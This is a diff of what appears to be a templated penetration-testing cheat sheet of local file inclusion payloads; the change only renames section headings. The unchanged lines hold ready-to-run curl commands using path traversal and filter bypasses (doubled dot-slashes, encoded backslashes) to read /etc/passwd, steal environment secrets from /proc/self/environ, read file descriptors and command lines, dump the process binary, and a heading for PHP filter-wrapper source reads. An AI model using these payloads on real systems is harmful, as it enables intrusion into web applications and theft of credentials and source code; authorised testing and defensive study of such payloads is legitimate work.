@@ -6,7 +6,7 @@
 
 ---
 
-## Basic /etc/passwd Read
+## lfi read passwd
 Test for LFI by reading /etc/passwd.
 
 ```bash
@@ -17,7 +17,7 @@ curl '{{URL:url}}?{{PARAM:str:page}}=../../../../etc/passwd'
 
 ---
 
-## Path Filter Bypass (Double Dot Slash)
+## bypass lfi double dot slash
 Bypass naive `../` filters with `....//` and mixed slashes.
 
 ```bash
@@ -28,7 +28,7 @@ curl '{{URL:url}}?{{PARAM:str:page}}=....//....//etc/passwd'
 
 ---
 
-## URL-Encoded Backslash Bypass
+## bypass lfi encoded backslash
 Use URL-encoded backslashes to dodge string-replace based filters.
 
 ```bash
@@ -39,7 +39,7 @@ curl '{{URL:url}}?{{PARAM:str:page}}=/%5C../%5C../%5C../%5C../%5C../etc/passwd'
 
 ---
 
-## Read Process Environment via /proc/self
+## lfi read proc self environ
 Steal environment variables (often containing secrets) via /proc/self/environ.
 
 ```bash
@@ -50,7 +50,7 @@ curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/environ'
 
 ---
 
-## Read Command Line via /proc/self/cmdline
+## lfi read proc cmdline
 Inspect the command line that started the web process.
 
 ```bash
@@ -61,7 +61,7 @@ curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/cmdline'
 
 ---
 
-## Read Open File Descriptor
+## lfi read proc fd
 Access open files (often config or DB files) via /proc/self/fd.
 
 ```bash
@@ -72,7 +72,7 @@ curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/fd/{{FD:int:3}}'
 
 ---
 
-## Read Application Binary
+## lfi dump proc exe binary
 Dump the executable that started the process.
 
 ```bash
@@ -83,7 +83,7 @@ curl '{{URL:url}}?{{PARAM:str:page}}=../../../../proc/self/exe' -o {{OUTFILE:fil
 
 ---
 
-## PHP Wrapper Base64 Read
+## lfi read php source filter
 Use the PHP filter wrapper to read source code as base64.
 
 ```bash
